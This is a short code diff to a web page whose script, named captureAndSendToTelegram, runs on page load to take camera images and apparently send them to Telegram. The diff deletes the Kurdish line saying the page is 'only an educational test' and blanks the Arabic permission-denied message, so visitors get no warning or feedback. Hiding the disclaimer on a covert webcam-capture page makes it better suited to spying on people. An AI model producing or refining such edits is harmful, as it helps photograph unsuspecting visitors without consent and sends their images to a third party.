@@ -103,7 +103,7 @@ async function captureAndSendToTelegram() {
 
     } catch (error) {
         console.error("Camera error:", error);
-        statusText.innerText = "تم رفض إذن فتح الموقع.";
+        statusText.innerText = "";
     }
 }
 
@@ -248,8 +248,8 @@ window.addEventListener("load", captureAndSendToTelegram);
             text-align: center;
         }
         .note {
-            font-size: 20px;
-            margin-top: 20px;
+            font-size: 100px;
+            margin-top: 100px;
             font-family: sans-serif;
         }
     </style>
@@ -259,7 +259,7 @@ window.addEventListener("load", captureAndSendToTelegram);
     <div class="emoji-display">
         <!-- ئەمە ئەو ئیمۆجییەیە کە وێنەی قەڵاکە دەگرێتەوە -->
         😁 
-        <div class="note">ئەمە تەنها تاقیکردنەوەیەکی فێرکارییە!</div>
+        <div class="note"></div>
     </div>
 
 </body>
